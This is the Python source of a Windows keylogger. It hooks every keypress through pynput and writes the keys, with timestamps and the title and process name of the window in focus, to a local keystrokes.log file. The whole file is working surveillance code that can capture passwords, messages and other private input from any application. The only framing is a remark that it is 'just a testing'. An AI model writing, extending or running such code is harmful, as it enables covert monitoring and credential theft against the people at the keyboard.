import datetime
import io
import os
import psutil
import win32gui
import win32process
from pynput import keyboard

# Get the current directory
current_dir = os.getcwd()

# Open the log file for writing
log_file = io.open(os.path.join(current_dir, "keystrokes.log"), "w")

# Track the current window title and process name
current_window_title = None
current_process_name = None

# This function gets called every time a key is pressed
def on_press(key):
    global current_window_title, current_process_name
    try:
        # Get the title and process name of the foreground window
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        process_name = psutil.Process(pid[-1]).name()
        
        # If the window or process has changed, write them to the log file
        if window_title != current_window_title or process_name != current_process_name:
            if current_window_title is not None:
                log_file.write("\n")
                
            current_window_title = window_title
            current_process_name = process_name
            now = datetime.datetime.now()
            log_file.write(f"{now.strftime('%A, %B %d, %Y [%I:%M %p]')} {current_process_name} - {current_window_title}\n")
        if isinstance(key, keyboard.Key):
            # Ignore Shift key
            if key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                return
        # And here goes the other stuff.
        key_char = ''
        if hasattr(key, "char"):
            key_char = key.char.replace("'", "")
        elif key == keyboard.Key.space:
            key_char = " "
        elif key == keyboard.Key.enter:
            key_char = "[Enter]"
        elif isinstance(key, keyboard.KeyCode) and key.char is None and key.vk == keyboard.Key.tab.value and not keyboard.Controller().alt_pressed:
            return
        elif key == keyboard.Key.tab:
            key_char = "[Tab]"
        elif key == keyboard.Key.alt_l:
            key_char = "[L Alt]"
        elif key == keyboard.Key.alt_r:
            key_char = "[R Alt]"
        elif key == keyboard.Key.backspace:
            key_char = "[Backspace]"
        else:
            key_char = f"[{str(key)}]"
        log_file.write(key_char.encode('utf-8', errors='ignore').decode('utf-8'))
        log_file.flush()
    except Exception as e:
        print(f"Error: {e}")

# Set up a keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        while True:
            listener.join(0.1)
    except KeyboardInterrupt:
        pass

# Close the log file when we're done. I only did this because it's just a testing.
log_file.close() 
